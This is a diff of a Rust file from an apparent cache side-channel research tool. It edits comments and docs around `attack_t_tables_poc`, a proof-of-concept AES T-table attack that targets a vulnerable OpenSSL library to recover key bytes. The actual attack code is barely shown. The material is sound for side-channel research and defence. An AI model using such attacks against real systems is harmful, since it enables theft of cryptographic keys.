@@ -1,4 +1,3 @@
-//#![feature(specialization)]
 #![feature(unsafe_block_in_unsafe_fn)]
 #![deny(unsafe_op_in_unsafe_fn)]
 
@@ -16,32 +15,6 @@ use std::collections::HashMap;
 use std::fs::File;
 use std::path::Path;
 
-// Generic AES T-table attack flow
-
-// Modularisation :
-// The module handles loading, then passes the relevant target infos to a attack strategy object for calibration
-// Then the module runs the attack, calling the attack strategy to make a measurement and return hit/miss
-
-// interface for attack : run victim (eat a closure)
-// interface for measure : give measurement target.
-
-// Can attack strategies return err ?
-
-// Load a vulnerable openssl - determine adresses af the T tables ?
-// Run the calibrations
-// Then start the attacks
-
-// This is a serialized attack - either single threaded or synchronised
-
-// parameters required
-
-// an attacker measurement
-// a calibration victim
-
-// Access Driven
-
-// TODO
-
 pub struct AESTTableParams<'a> {
     pub num_encryptions: u32,
     pub key: [u8; 32],
@@ -50,10 +23,16 @@ pub struct AESTTableParams<'a> {
 }
 
 const KEY_BYTE_TO_ATTACK: usize = 0;
-
+/// This function takes a side channel, attack parameters and a name used for logging purpose and
+/// runs the AES T-table attack using a shared read-only address attack.
+///
+/// It prints out the attack results as a CSV.
+///
 /// # Safety
 ///
-/// te need to refer to the correct t tables offset in the openssl library at path.
+/// te must refer to the correct t tables offset in the openssl library at path.
+///
+/// Note : This function doesn't handle the case where the address space is not shared. (Additionally you have the issue of complicated eviction sets due to complex addressing)
 pub unsafe fn attack_t_tables_poc<T: ChannelHandle>(
     side_channel: &mut impl TableCacheSideChannel<T>,
     parameters: AESTTableParams,
@@ -61,8 +40,6 @@ pub unsafe fn attack_t_tables_poc<T: ChannelHandle>(
 ) {
     let old_affinity = set_affinity(&side_channel.main_core());
 
-    // Note : This function doesn't handle the case where the address space is not shared. (Additionally you have the issue of complicated eviction sets due to complex addressing)
-    // TODO
 
     // Possible enhancements : use ability to monitor several addresses simultaneously.
     let fd = File::open(parameters.openssl_path).unwrap();
